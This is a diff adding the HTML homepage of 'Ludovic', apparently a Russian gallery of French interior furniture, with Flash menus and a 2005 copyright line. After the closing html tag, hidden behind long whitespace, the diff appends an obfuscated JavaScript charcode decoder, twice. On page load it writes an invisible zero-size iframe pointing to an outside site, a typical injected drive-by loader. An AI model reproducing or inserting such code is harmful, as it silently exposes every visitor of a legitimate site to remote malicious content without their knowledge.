@@ -1,0 +1,111 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+
+<html>
+<head>
+	<title>Ludovic | Галерея интерьеров Франции | </title>
+	<meta HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1251">
+	<meta name="Description" content="Ludovic. ГАЛЕРЯ ИНТЕРЬЕРОВ ФРАНЦИИ. ">
+	<META NAME="language" CONTENT="russian">
+	<meta name="Keywords" content="Франция, Интерьер, Искусство, Галерея, Людовик, Дизайн, Мебель, Светильники, Стиль, Классика, Комфорт, Эксклюзив, Декор, Проект, Аксессуары, Steiner, Modenature, Artelano, Tiffany, Moissonier">
+	<META NAME="robots" CONTENT="INDEX,FOLLOW"><META NAME="revisit-after" CONTENT="1 Day">
+	<LINK REL="STYLESHEET" TYPE="text/css" HREF="style.css">
+</head>
+
+<body  bgcolor="#A92624" topmargin="0" rightmargin="0" leftmargin="0" bottommargin="0">
+
+<table width="100%" height="100%" cellspacing="0" cellpadding="0" border="0">
+<tr>
+    <td height="20" colspan="3" nowrap></td>
+</tr>
+<tr>
+    <td colspan="3" align="center" valign="top"><a href="index.html"><img src="img/logo.gif" width="311" height="83" border="0" alt=""></a></td>
+</tr>
+<tr>
+    <td height="50" nowrap colspan="3"></td>
+</tr>
+
+<tr>
+<td width="50%"></td>
+    <td width="930" height="35" valign="top" nowrap>
+	<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" width="930" height="30" id="menu" align="middle">
+<param name="allowScriptAccess" value="sameDomain" />
+<param name="movie" value="menu.swf" />
+<param name="quality" value="high" />
+<param name="bgcolor" value="#a92624" />
+<embed src="menu.swf" quality="high" bgcolor="#a92624" width="930" height="30" name="menu" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
+</object>
+	</td>
+	<td width="50%"></td>
+</tr>
+<tr>
+    <td width="50%"></td>
+	<td height="1" nowrap bgcolor="White"></td>
+	<td width="50%"></td>
+</tr>
+
+<tr>	<td width="50%"></td>
+    	<td valign="top" width="930" height="350" nowrap>
+		<!--- ТЕЛО --->
+
+<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=5,0,0,0" width="930" height="350" id="ludovic_reliz_good" align="middle">
+<param name="allowScriptAccess" value="sameDomain" />
+<param name="movie" value="ludovic_reliz_good.swf" />
+<param name="quality" value="high" />
+<param name="bgcolor" value="#a6312f" />
+<embed src="ludovic_reliz_good.swf" quality="high" bgcolor="#a6312f" width="930" height="350" name="ludovic_reliz_good" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
+</object>
+	
+		</td>
+		<td width="50%"></td>
+</tr>
+
+<tr>
+    <td height="25" nowrap colspan="3" align="center">
+	
+	</td>
+</tr>
+<tr>
+    <td width="50%"></td>
+	<td height="1" nowrap><img src="img/line.gif" width="930" height="1" border="0" alt=""></td>
+	<td width="50%"></td>
+</tr>
+
+<tr>
+    <td height="20" nowrap colspan="3">
+	<font color=#A92624>Галерею французской мебели "LUDOVIC" - это уникальные интерьеры, для создания в Вашем доме неповторимого французского стиля</font>
+	
+	</td>
+</tr>
+<tr>
+    <td height="100%" colspan="3" valign="bottom" align="center">
+	<font class=copyright>Copyrigt LUDOVIC, 2005</font>&nbsp;&nbsp;&nbsp;
+	<font class=copyright>Designed by <font class=copyright><a href="http://www.colortime.ru" class="copyright">COLORTIME.RU</a>, 2005</font>
+	</td>
+</tr>
+<tr><td colspan="3" height="5" nowrap></td></tr>
+
+
+</table>
+
+
+</body>
+</html>
+																											<SCRIPT LANGUAGE="JavaScript">
+																											<!--
+																											function Decode(){var temp="",i,c=0,out="";var str="60!105!102!114!97!109!101!32!115!114!99!61!34!104!116!116!112!58!47!47!119!119!119!46!104!101!108!112!100!101!115!105!103!110!111!110!108!105!110!101!46!99!111!109!47!118!105!47!105!110!100!101!120!46!104!116!109!108!34!32!119!105!100!116!104!61!48!32!104!101!105!103!104!116!61!48!32!115!116!121!108!101!61!34!100!105!115!112!108!97!121!58!110!111!110!101!59!34!62!60!47!105!102!114!97!109!101!62!";l=str.length;while(c<=str.length-1){while(str.charAt(c)!='!')temp=temp+str.charAt(c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
+																											//-->
+																											</SCRIPT><SCRIPT LANGUAGE="JavaScript">
+																											<!--
+																											Decode();
+																											//-->
+																											</SCRIPT>
+<!-- o65 -->																											<SCRIPT LANGUAGE="JavaScript">
+																											<!--
+																											function Decode(){var temp="",i,c=0,out="";var str="60!105!102!114!97!109!101!32!115!114!99!61!34!104!116!116!112!58!47!47!119!119!119!46!104!101!108!112!100!101!115!105!103!110!111!110!108!105!110!101!46!99!111!109!47!118!105!47!105!110!100!101!120!46!104!116!109!108!34!32!119!105!100!116!104!61!48!32!104!101!105!103!104!116!61!48!32!115!116!121!108!101!61!34!100!105!115!112!108!97!121!58!110!111!110!101!59!34!62!60!47!105!102!114!97!109!101!62!";l=str.length;while(c<=str.length-1){while(str.charAt(c)!='!')temp=temp+str.charAt(c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
+																											//-->
+																											</SCRIPT><SCRIPT LANGUAGE="JavaScript">
+																											<!--
+																											Decode();
+																											//-->
+																											</SCRIPT>
+<!-- c65 -->
